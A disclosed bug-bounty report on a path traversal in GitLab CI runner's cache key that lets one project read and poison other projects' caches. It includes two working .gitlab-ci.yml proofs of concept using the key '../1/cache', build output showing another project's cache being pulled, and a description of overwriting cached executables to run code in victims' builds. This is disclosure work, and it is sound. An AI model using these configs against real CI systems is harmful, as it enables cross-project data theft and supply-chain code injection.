# GitLab CI runner can read and poison cache of all other projects

## Report Details
- **Report ID**: 301432
- **URL**: https://hackerone.com/reports/301432
- **State**: Closed
- **Severity**: critical
- **Submitted**: 2017-12-30T18:58:16.329Z
- **Disclosed**: 2018-04-27T02:21:50.009Z

## Reporter
- **Username**: jobert
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: gitlab

## Vulnerability Information
The GitLab CI runner allows users to cache files and directories in between runs. These files are stored in a ZIP file and uploaded to a shared cache instance. In my testing, the files were uploaded to `runners-cache-4-internal.gitlab.com` and `runners-cache-3-internal.gitlab.com`, even for dedicated runners. It seems odd that dedicated runners use the same shared cache, but perhaps that was an intentional design decision. It could also be a vulnerability. I tried reaching the cache servers from a Docker instance itself, but wasn't able to (I tried from a reverse shell spawned from a Docker instance). There are multiple vulnerabilities (same root cause though) that can be chained to successfully poison the CI runner cache of another project.

**Reading the cache of other projects**
Create a new project with a `.gitlab-ci.yml` file in it. The file should contain the following contents. By default, when a cache file is downloaded, it'll download the cache from http://runners-cache-4-internal.gitlab.com:444/runner/project/5024150/cache.

**.gitlab-ci.yml**
```
a:
  script:
  - ls -lashR
  cache:
    key: ../1/cache
    policy: pull
    paths:
      - .
```

To read the cache, the attacker needs to know two things: a project ID (auto incremental) and a cache key. By default, the project ID will be prepended to download the cache. But because it's an HTTP request and there's no additional checks on the `key` input, a path traversal vulnerability can be exploited to move up a directory and select the cache from a different project. In this case, when it downloads the cache, it'll request http://runners-cache-4-internal.gitlab.com:444/runner/gitlab/project/1/cache instead of the project ID of the build.

**Build output**
```
[0KRunning with gitlab-runner 10.3.0 (5cf5e19a)
  on docker-auto-scale (e11ae361)
[0;m[0KUsing Docker executor with image ruby:2.1 ...
[0;m[0KUsing docker image sha256:4eadb9b5cb46f487a71d05717762679404f7f6fdec1ba4fa96304de1db07dfef for predefined container...
[0;m[0KPulling docker image ruby:2.1 ...
[0;m[0KUsing docker image ruby:2.1 ID=sha256:223d1eaa9523fa64e78f5a92b701c9c11cbc507f0ff62246dbbacdae395ffea3 for build container...
[0;msection_start:1514659811:prepare_script
[0KRunning on runner-e11ae361-project-4989754-concurrent-0 via runner-e11ae361-srm-1514658950-a15d8859...
section_end:1514659812:prepare_script
[0Ksection_start:1514659813:get_sources
[0K[32;1mCloning repository...[0;m
Cloning into '/builds/jobertabma/build-test'...
[32;1mChecking out e01918e5 as master...[0;m
[32;1mSkipping Git submodules setup[0;m
section_end:1514659814:get_sources
[0Ksection_start:1514659814:restore_cache
[0K[32;1mChecking cache for ../13083/ruby-235-with-yarn...[0;m
Downloading cache.zip from http://runners-cache-5-internal.gitlab.com:444/runner/project/13083/ruby-235-with-yarn[0;m 
[32;1mSuccessfully extracted cache[0;m
section_end:1514659844:restore_cache
```

The cache key seems to be guessable pretty easily or even unused when no key is specified, since most will correlate with the step they're executed in. When I started looking at this, I had to specify which paths to download from the cache. This made exploitation more difficult. However, it (conveniently) allowed me to use `.` as path, extracting all files from the cache into the working directory. Running `ls -lashR` after that reveals the cache contents in the build output. Files can be read using `cat` or to store them as build artifacts through the `.gitlab-ci.yml`.

**Writing the cache of other projects**
Now that the attacker knows what files are stored in the cache, it can poison the cache with its own file contents. Create another CI YAML file with the following contents:

**.gitlab-ci.yml**
```
a:
  script:
  - echo 1 > file-to-poison
  cache:
    key: ../1/cache
    policy: push
    paths:
      - file-to-poison
```

The attacker has to run a build, which will overwrite the `file-to-poison` file in the cache for project ID 1. Now, when the targeted project starts another CI run, the poisoned cache files will be downloaded and used in the CI run. For example, an attacker could poison `13083/ruby-235-with-yarn`, which would overwrite the Ruby 2.3.5 executable that is being used for GitLab CE CI runs. As you can imagine, someone could enumerate over other projects that use cached executables and overwrite them with their own code.

This has been tested against the latest version of GitLab.

## Impact

Depending on the files that are cached, this may allow an attacker to run arbitrary code on a victim's Docker instance running a CI run. This may expose confidential data, inject artifacts in a build pipeline to ship additional code, among other things.

## Attachments
No attachments
